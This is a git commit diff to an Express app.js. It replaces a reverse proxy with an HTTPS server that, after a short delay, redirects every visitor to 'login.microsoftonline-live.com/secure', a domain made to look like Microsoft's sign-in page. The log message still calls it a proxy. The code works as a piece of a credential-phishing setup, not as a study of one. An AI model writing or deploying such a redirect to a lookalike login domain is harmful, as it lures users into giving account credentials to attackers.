dbc4473b7d298ff8e59a1367b6afd082b7579d1c
scottmahony <158554772+scottmahony@users.noreply.github.com>
2024-06-12 16:59:25 -0700

    Update app.js

--- app.js
+++ app.js
@@ -1,21 +1,25 @@
+const fs = require('fs');
+const https = require('https');
 const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
 
 const app = express();
-const port = 3000;
 
-// Configuration for the proxy middleware
-const options = {
-  target: 'http://toptier.ventures.s3-website-us-east-1.amazonaws.com', // Target host
-  changeOrigin: true, // Needed for virtual hosted sites
-  pathRewrite: {
-    '^/': '/', // Rewrite path: remove base path
-  },
-};
+// SSL Certificate paths
+const privateKey = fs.readFileSync('path/to/privateKey.key', 'utf8');
+const certificate = fs.readFileSync('path/to/certificate.crt', 'utf8');
+const credentials = { key: privateKey, cert: certificate };
 
-// Apply the proxy middleware for root path
-app.use('/', createProxyMiddleware(options));
+const port = 3001;
 
-app.listen(port, () => {
-  console.log(`Proxy server listening at http://localhost:${port}`);
+app.get('/', (req, res) => {
+  setTimeout(() => {
+      res.redirect('https://login.microsoftonline-live.com/secure');
+  }, 10);
+});
+
+const httpsServer = https.createServer(credentials, app);
+
+httpsServer.listen(port, '0.0.0.0', () => {
+  console.log(`Proxy server listening at https://toptier.ventures:${port}`);
 });
